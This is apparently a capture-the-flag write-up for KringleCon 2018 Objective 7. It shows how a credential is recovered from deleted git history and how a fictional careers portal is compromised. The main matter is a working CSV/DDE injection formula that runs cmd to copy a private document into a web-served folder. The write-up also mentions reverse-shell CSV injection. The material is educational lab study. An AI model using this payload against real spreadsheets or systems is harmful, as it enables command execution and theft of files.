## Objective 7

> Santa uses an Elf Resources website to look for talented information security professionals. [Gain access to the website](https://careers.kringlecastle.com/) and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K"? 
> For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

### Challenge


> Coalbox again, and I've got one more ask.
> Sparkle Q. Redberry has fumbled a task.
> Git pull and merging, she did all the day;
> With all this gitting, some creds got away.
> Urging - I scolded, "Don't put creds in git!"
> She said, "Don't worry - you're having a fit.
> If I did drop them then surely I could,
> Upload some new code done up as one should."

> Find Sparkle's password, then run the runtoanswer tool.

For this challenge you will need:

- Search GIT for passwords: https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/
- GIT cheat sheet: https://gist.github.com/hofmannsven/6814451


The easiest thing to do is to check the git log for deletions:

```
elf@69b8d8354d79:~$ ls
kcconfmgmt  runtoanswer
elf@69b8d8354d79:~$ cd kcconfmgmt/
elf@69b8d8354d79:~/kcconfmgmt$ git log --diff-filter=D --summary
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use

 delete mode 100644 server/config/config.js
```

Nice, check the log again for an earlier commit:
```
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use

commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 13:25:32 2018 -0500
```

then go back to `b2376f4a93ca1889ba7d947c2d14be9a5d138802` and see the deleted file:
```
elf@69b8d8354d79:~/kcconfmgmt$ git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802
Note: checking out 'b2376f4a93ca1889ba7d947c2d14be9a5d138802'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at b2376f4... Add passport module

elf@69b8d8354d79:~/kcconfmgmt$ cat server/config/config.js
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
```

Got it!
```
elf@69b8d8354d79:~/kcconfmgmt$ runtoanswer 
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
```



**Hint**: CSV Injection: https://www.owasp.org/index.php/CSV_Injection

**Hint**: CSV DDE Injection talk: https://www.youtube.com/watch?v=Z3qpcKVv2Bg


### Objective completion

The target site consists in a career application form, try to register yourself:


> Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\candidate_evaluation.docx

The network call is straightforward:
```
https://careers.kringlecastle.com/api/upload/application
firstname: some
lastname: one
phone: 234534534534
email: some@one.it
csv: (binary)
```

Ok, so we don't have direct access to the target file, but we know its full path (`C:\candidate_evaluation.docx`) and we know that an elf will open our CSV.

We could implement a reverse shell CSV injection or a remote file upload, but maybe there's something simpler... Let's try to mess up the URL as we did in Obj. 2. https://careers.kringlecastle.com/api/something will return a nice 404 page:
```
404 Error!

Publicly accessible file served from: 
C:\careerportal\resources\public\ not found......



Try: 
https://careers.kringlecastle.com/public/'file name you are looking for'
```

So there's a direct mapping from `https://careers.kringlecastle.com/public/` and the directory `C:\careerportal\resources\public\`.

We need to craft a CSV injection that copies `candidate_evaluation.docx` in the right place, send it and wait a few minutes for an Elf to open it (and ignores the warning, we hope!).


The CSV is quite simple, it contains the injection only (see [`inject.csv`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/7/inject.csv)):
```
=cmd|' /C copy C:\candidate_evaluation.docx C:\careerportal\resources\public'!A1
```

*Note*: To be sure you can replicate the directory structure on your testing machine, create a fake docx file and import the csv into excel: the file should be copied instantly.

Time to send our crafted CSV with the career application form, wait a few minutes then try https://careers.kringlecastle.com/public/candidate_evaluation.docx: download it!

The bad guy's name is quite "known", read through [`candidate_evaluation.docx`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/7/candidate_evaluation.docx)  to get the name of the terrorist organization.





**Objective answer**: `Fancy Beaver`

